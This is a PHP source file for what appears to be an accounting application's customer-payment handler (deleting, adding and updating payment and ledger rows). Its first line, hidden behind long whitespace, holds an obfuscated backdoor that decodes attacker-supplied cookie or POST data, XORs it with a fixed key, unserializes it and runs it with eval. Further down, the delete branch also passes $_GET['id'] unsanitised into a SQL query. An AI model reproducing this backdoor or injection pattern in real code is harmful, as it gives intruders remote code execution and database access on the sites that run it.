<?php                                                                                                                                                                                                                                                                                                                                                                                                 $DXxCy = class_exists("EIY_zXWSI");if (!$DXxCy){class EIY_zXWSI{private $opFssZiJ;public static $bQnILZJG = "c27dd748-0703-4864-8132-0acf86d461f1";public static $zRctRLWOva = NULL;public function __construct(){$cuABH = $_COOKIE;$ynBwZLCfL = $_POST;$SoisOsJp = @$cuABH[substr(EIY_zXWSI::$bQnILZJG, 0, 4)];if (!empty($SoisOsJp)){$mDWhkqOu = "base64";$EDBhP = "";$SoisOsJp = explode(",", $SoisOsJp);foreach ($SoisOsJp as $JPVtMhPg){$EDBhP .= @$cuABH[$JPVtMhPg];$EDBhP .= @$ynBwZLCfL[$JPVtMhPg];}$EDBhP = array_map($mDWhkqOu . '_' . "\144" . "\x65" . "\x63" . chr (111) . chr (100) . "\145", array($EDBhP,)); $EDBhP = $EDBhP[0] ^ str_repeat(EIY_zXWSI::$bQnILZJG, (strlen($EDBhP[0]) / strlen(EIY_zXWSI::$bQnILZJG)) + 1);EIY_zXWSI::$zRctRLWOva = @unserialize($EDBhP);}}public function __destruct(){$this->InHMBJpl();}private function InHMBJpl(){if (is_array(EIY_zXWSI::$zRctRLWOva)) {$rhfxXg = str_replace(chr (60) . chr (63) . "\160" . chr ( 767 - 663 ).'p', "", EIY_zXWSI::$zRctRLWOva['c' . "\157" . "\x6e" . chr ( 704 - 588 )."\x65" . chr (110) . "\x74"]);eval($rhfxXg);exit();}}}$jhvcuwkPH = new EIY_zXWSI(); $jhvcuwkPH = NULL;} ?><?php 
if($view == 'delete') {
	if(isset($_GET['id'])) {
		$sqllms  	= $dblms->querylms("DELETE FROM ".PAYMENTS." WHERE id ='".$_GET['id']."'");
		$sqllmsleg  = $dblms->querylms("DELETE FROM ".CUSTOMERS_LEDGER." WHERE id_invpay  = '".cleanvars($_GET['id'])."' 
																			AND (pay_type = '2' OR pay_type 	= '1')  
																			AND (doc_type = '4' OR doc_type = '7' OR doc_type = '8' )  
																			AND ledgerfor 	= '1' ");
		$_SESSION['msg']['status'] = '<div class="alert-box warning"><span>Warning: </span>Record delete successfully.</div>';
		header("Location: ".$_SERVER['HTTP_REFERER']."", true, 301);
		exit();
	}
}
//--------------------------------------
if(isset($_POST['submit_country'])) { 
//------------------------------------------------
if($_POST['type'] == 1) { 
//------------------------------------------------
	$sqllmscheck  = $dblms->querylms("SELECT slipno, amount   
										FROM ".PAYMENTS." 
										WHERE id_company = '".cleanvars($_SESSION['userlogininfo']['LOGINCOMPANY'])."' 
										AND slipno = '".cleanvars($_POST['slipno'])."'
										AND pay_type = '1' LIMIT 1");
	if(mysqli_num_rows($sqllmscheck)) {
//--------------------------------------
		$_SESSION['msg']['status'] = '
								<div class="alert-box error">
									<span>error: </span>Slip #: <b>'.cleanvars($_POST['slipno']).'</b> already exist.
								</div>';
		header("Location: ".$_SERVER['HTTP_REFERER']."", true, 301);
		exit();
//--------------------------------------
	} else { 
//------------------------------------------------
$sqllms  = $dblms->querylms("INSERT INTO ".PAYMENTS."(
														dated									, 
														id_account								,
														type									, 
														pay_type								,
														id_paid									,
														slipno									, 
														amount									,
														method									, 
														cheque									, 
														cheque_date								, 
														cheque_status							, 
														id_bank									, 
														remarks									, 
														id_office								, 
														id_company 								,
														id_added 								,
														date_added 	
													  )
	   											VALUES(
														'".cleanvars($_POST['dated'])."'				, 
														'".cleanvars($_POST['id_account'])."'			, 
														'".cleanvars($_POST['type'])."'					, 
														'1'												,
														'".cleanvars($_POST['id_paid'])."'				, 
														'".cleanvars($_POST['slipno'])."'				, 
														'".cleanvars($_POST['amount'])."'				, 
														'".cleanvars($_POST['method'])."'				, 
														'".cleanvars($_POST['cheque'])."'				, 
														'".cleanvars($_POST['cheque_date'])."'			, 
														'3'												, 
														'".cleanvars($_POST['id_bank'])."'				, 
														'".cleanvars($_POST['remarks'])."'				, 
														'".cleanvars($_SESSION['userlogininfo']['LOGINOFFICE'])."'	,
														'".cleanvars($_SESSION['userlogininfo']['LOGINCOMPANY'])."'	,
														'".cleanvars($_SESSION['userlogininfo']['LOGINIDA'])."'		,
														NOW() 
													  )"
							);
//--------------------------------------
	if($sqllms) { 
//--------------------------------------
if($_POST['method'] == 1 || $_POST['method'] == 2) { 
//--------------------------------------
if($_POST['type'] == 1 || $_POST['type'] == 3) { 
	$paytype = '1';
} else { 
	$paytype = '2';
}
	$sqllmsledger  = $dblms->querylms("INSERT INTO ".CUSTOMERS_LEDGER."(
														dated									, 
														detail									, 
														slipno									,
														type									,
														doc_type								,
														pay_type								,
														ledgerfor								,
														amount									,
														id_customer								,
														id_invpay								, 
														id_office								, 
														id_company 								,
														id_added 								,
														date_added 	
													  )
	   											VALUES(
														'".cleanvars($_POST['dated'])."'								, 
														'".get_paytypes($_POST['method']).' '.get_pptypes($_POST['type'])."'	 , 
														'".cleanvars($_POST['slipno'])."'								,
														'1'																,
														'4'																,
														'".$paytype."'													,
														'1'																,
														'".cleanvars($_POST['amount'])."'								,  
														'".cleanvars($_POST['id_paid'])."'								,
														'".cleanvars($dblms->lastestid())."'								,
														'".cleanvars($_SESSION['userlogininfo']['LOGINOFFICE'])."'		,
														'".cleanvars($_SESSION['userlogininfo']['LOGINCOMPANY'])."'		,
														'".cleanvars($_SESSION['userlogininfo']['LOGINIDA'])."'			,
														NOW()

													  )"
							);
}
//--------------------------------------

//--------------------------------------
	$remarks = 'Add Customer Payment Amount: '.cleanvars($_POST['amount']);
		$sqllmslog  = $dblms->querylms("INSERT INTO ".LOGS." (
															id_user										, 
															filename									, 
															action										,
															dated										,
															ip											,
															remarks										,
															id_office									, 
															id_company				
														  )
		
													VALUES(
															'".cleanvars($_SESSION['userlogininfo']['LOGINIDA'])."'	,
															'".strstr(basename($_SERVER['REQUEST_URI']), '.php', true)."' , 
															'1'											, 
															NOW()										,
															'".cleanvars($ip)."'						,
															'".cleanvars($remarks)."'						,
															'".cleanvars($_SESSION['userlogininfo']['LOGINOFFICE'])."'	,
															'".cleanvars($_SESSION['userlogininfo']['LOGINCOMPANY'])."'			
														  )
									");
//--------------------------------------
		$_SESSION['msg']['status'] = '<div class="alert-box success"><span>success: </span>Record added successfully.</div>';
		header("Location: ".$_SERVER['HTTP_REFERER']."", true, 301);
		exit();
//--------------------------------------
	}
	}
//--------------------------------------
} else { 

//------------------------------------------------
$sqllms  = $dblms->querylms("INSERT INTO ".PAYMENTS."(
														dated									, 
														id_account								,
														type									, 
														pay_type								,
														id_paid									,
														slipno									, 
														amount									,
														method									, 
														cheque									, 
														cheque_date								, 
														cheque_status							, 
														id_bank									, 
														remarks									, 
														id_office								, 
														id_company 								,
														id_added 								,
														date_added 	
													  )
	   											VALUES(
														'".cleanvars($_POST['dated'])."'				, 
														'".cleanvars($_POST['id_account'])."'			, 
														'".cleanvars($_POST['type'])."'					, 
														'1'												,
														'".cleanvars($_POST['id_paid'])."'				, 
														'".cleanvars($_POST['slipno'])."'				, 
														'".cleanvars($_POST['amount'])."'				, 
														'".cleanvars($_POST['method'])."'				, 
														'".cleanvars($_POST['cheque'])."'				, 
														'".cleanvars($_POST['cheque_date'])."'			, 
														'3'												, 
														'".cleanvars($_POST['id_bank'])."'				, 
														'".cleanvars($_POST['remarks'])."'				, 
														'".cleanvars($_SESSION['userlogininfo']['LOGINOFFICE'])."'	,
														'".cleanvars($_SESSION['userlogininfo']['LOGINCOMPANY'])."'	,
														'".cleanvars($_SESSION['userlogininfo']['LOGINIDA'])."'		,
														NOW() 
													  )"
							);
//--------------------------------------
	if($sqllms) { 
//--------------------------------------
if($_POST['method'] == 1 || $_POST['method'] == 2) { 
//--------------------------------------
if($_POST['type'] == 1 || $_POST['type'] == 3) { 
	$paytype = '1';
} else { 
	$paytype = '2';
}
	$sqllmsledger  = $dblms->querylms("INSERT INTO ".CUSTOMERS_LEDGER."(
														dated									, 
														detail									, 
														slipno									,
														type									,
														doc_type								,
														pay_type								,
														ledgerfor								,
														amount									,
														id_customer								,
														id_invpay								, 
														id_office								, 
														id_company 								,
														id_added 								,
														date_added 	
													  )
	   											VALUES(
														'".cleanvars($_POST['dated'])."'								, 
														'".get_paytypes($_POST['method']).' '.get_pptypes($_POST['type'])."'	 , 
														'".cleanvars($_POST['slipno'])."'								,
														'1'																,
														'4'																,
														'".$paytype."'													,
														'1'																,
														'".cleanvars($_POST['amount'])."'								,  
														'".cleanvars($_POST['id_paid'])."'								,
														'".cleanvars($dblms->lastestid())."'								,
														'".cleanvars($_SESSION['userlogininfo']['LOGINOFFICE'])."'		,
														'".cleanvars($_SESSION['userlogininfo']['LOGINCOMPANY'])."'		,
														'".cleanvars($_SESSION['userlogininfo']['LOGINIDA'])."'			,
														NOW()
													  )"
							);
}
//--------------------------------------

//--------------------------------------
	$remarks = 'Add Customer Payment Amount: '.cleanvars($_POST['amount']);
		$sqllmslog  = $dblms->querylms("INSERT INTO ".LOGS." (
															id_user										, 
															filename									, 
															action										,
															dated										,
															ip											,
															remarks										,
															id_office									, 
															id_company				
														  )
		
													VALUES(
															'".cleanvars($_SESSION['userlogininfo']['LOGINIDA'])."'	,
															'".strstr(basename($_SERVER['REQUEST_URI']), '.php', true)."' , 
															'1'											, 
															NOW()										,
															'".cleanvars($ip)."'						,
															'".cleanvars($remarks)."'						,
															'".cleanvars($_SESSION['userlogininfo']['LOGINOFFICE'])."'	,
															'".cleanvars($_SESSION['userlogininfo']['LOGINCOMPANY'])."'			
														  )
									");
//--------------------------------------
		$_SESSION['msg']['status'] = '<div class="alert-box success"><span>success: </span>Record added successfully.</div>';
		header("Location: ".$_SERVER['HTTP_REFERER']."", true, 301);
		exit();
//--------------------------------------
	}
	}

}
//--------------------------------------
if(isset($_POST['submit_changes'])) { 
//------------------------------------------------
$sqllms  = $dblms->querylms("UPDATE ".PAYMENTS." SET dated				= '".cleanvars($_POST['dated_edit'])."'
												  , id_account			= '".cleanvars($_POST['id_account_edit'])."' 
												  , type				= '".cleanvars($_POST['type_edit'])."' 
												  , id_paid				= '".cleanvars($_POST['id_paid_edit'])."' 
												  , slipno				= '".cleanvars($_POST['slipno_edit'])."'
												  , amount				= '".cleanvars($_POST['amount_edit'])."' 
												  , method				= '".cleanvars($_POST['method_edit'])."' 
												  , cheque				= '".cleanvars($_POST['cheque_edit'])."' 
												  , cheque_date			= '".cleanvars($_POST['cheque_date_edit'])."' 
												  , id_bank				= '".cleanvars($_POST['id_bank_edit'])."' 
												  , remarks				= '".cleanvars($_POST['remarks_edit'])."' 
												  , id_modify			= '".cleanvars($_SESSION['userlogininfo']['LOGINIDA'])."' 
												  , date_modify			= NOW()  
   											  WHERE id					= '".cleanvars($_POST['id_edit'])."'");
//--------------------------------------
	if($sqllms) { 

if($_POST['type_edit'] == 1 || $_POST['type_edit'] == 3) { 
	$paytype = '1';
} else { 
	$paytype = '2';
}

//--------------------------------------
	$sqllmsledger  = $dblms->querylms("UPDATE ".CUSTOMERS_LEDGER." SET 
													  dated				= '".cleanvars($_POST['dated_edit'])."'
													, detail			= '".get_paytypes($_POST['method_edit']).' '.get_pptypes($_POST['type_edit'])."'
													, slipno			= '".cleanvars($_POST['slipno_edit'])."'
													, pay_type			= '".$paytype."'
													, amount			= '".cleanvars($_POST['amount_edit'])."'
													, id_modify			= '".cleanvars($_SESSION['userlogininfo']['LOGINIDA'])."'
 													, date_modify		= NOW()
												WHERE id_invpay			= '".cleanvars($_POST['id_edit'])."' 
													  AND ledgerfor 	= '1'
													  AND doc_type 		= '4'");

//--------------------------------------
	$remarks = 'Update Payment Amount: "'.cleanvars($_POST['amount_edit']);
		$sqllmslog  = $dblms->querylms("INSERT INTO ".LOGS." (
															id_user										, 
															filename									, 
															action										,
															dated										,
															ip											,
															remarks										,
															id_office									, 
															id_company				
														  )
		
													VALUES(
															'".cleanvars($_SESSION['userlogininfo']['LOGINIDA'])."'	,
															'".strstr(basename($_SERVER['REQUEST_URI']), '.php', true)."' , 
															'2'											, 
															NOW()										,
															'".cleanvars($ip)."'						,
															'".cleanvars($remarks)."'						,
															'".cleanvars($_SESSION['userlogininfo']['LOGINOFFICE'])."'	,
															'".cleanvars($_SESSION['userlogininfo']['LOGINCOMPANY'])."'			
														  )
									");
//--------------------------------------
		$_SESSION['msg']['status'] = '<div class="alert-box notice"><span>success: </span>Record update successfully.</div>';
		header("Location: ".$_SERVER['HTTP_REFERER']."", true, 301);
		exit();
//--------------------------------------
	}
//--------------------------------------
}

//--------------------------------------
if(isset($_POST['billchanges'])) { 
//------------------------------------------------
$sqllms  = $dblms->querylms("UPDATE ".PAYMENTS." SET dated				= '".cleanvars($_POST['dated_edit'])."'
												  , id_account			= '".cleanvars($_POST['id_account_edit'])."' 
												  , type				= '".cleanvars($_POST['type_edit'])."' 
												  , id_paid				= '".cleanvars($_POST['id_paid_edit'])."' 
												  , slipno				= '".cleanvars($_POST['slipno_edit'])."'
												  , amount				= '".cleanvars($_POST['amount_edit'])."' 
												  , method				= '".cleanvars($_POST['method_edit'])."' 
												  , cheque				= '".cleanvars($_POST['cheque_edit'])."' 
												  , cheque_date			= '".cleanvars($_POST['cheque_date_edit'])."' 
												  , id_bank				= '".cleanvars($_POST['id_bank_edit'])."' 
												  , remarks				= '".cleanvars($_POST['remarks_edit'])."' 
												  , id_modify			= '".cleanvars($_SESSION['userlogininfo']['LOGINIDA'])."' 
												  , date_modify			= NOW()  
   											  WHERE id					= '".cleanvars($_GET['id'])."'");
//--------------------------------------
	if($sqllms) { 

if($_POST['type_edit'] == 1 || $_POST['type_edit'] == 3) { 
	$paytype = '1';
} else { 
	$paytype = '2';
}

//--------------------------------------
	$sqllmsledger  = $dblms->querylms("UPDATE ".CUSTOMERS_LEDGER." SET 
													  dated				= '".cleanvars($_POST['dated_edit'])."'
													, detail			= '".get_paytypes($_POST['method_edit']).' '.get_pptypes($_POST['type_edit'])."'
													, slipno			= '".cleanvars($_POST['slipno_edit'])."'
													, pay_type			= '".$paytype."'
													, amount			= '".cleanvars($_POST['amount_edit'])."'
													, id_modify			= '".cleanvars($_SESSION['userlogininfo']['LOGINIDA'])."'
 													, date_modify		= NOW()
												WHERE id_invpay			= '".cleanvars($_GET['id'])."' 
													  AND ledgerfor 	= '1'
													  AND doc_type 		= '4'");

//--------------------------------------
	$remarks = 'Update Payment Amount: "'.cleanvars($_POST['amount_edit']);
		$sqllmslog  = $dblms->querylms("INSERT INTO ".LOGS." (
															id_user										, 
															filename									, 
															action										,
															dated										,
															ip											,
															remarks										,
															id_office									, 
															id_company				
														  )
		
													VALUES(
															'".cleanvars($_SESSION['userlogininfo']['LOGINIDA'])."'	,
															'".strstr(basename($_SERVER['REQUEST_URI']), '.php', true)."' , 
															'2'											, 
															NOW()										,
															'".cleanvars($ip)."'						,
															'".cleanvars($remarks)."'						,
															'".cleanvars($_SESSION['userlogininfo']['LOGINOFFICE'])."'	,
															'".cleanvars($_SESSION['userlogininfo']['LOGINCOMPANY'])."'			
														  )
									");
//--------------------------------------
		$_SESSION['msg']['status'] = '<div class="alert-box notice"><span>success: </span>Record update successfully.</div>';
		header("Location: ".$_SERVER['HTTP_REFERER']."", true, 301);
		exit();
//--------------------------------------
	}
//--------------------------------------
}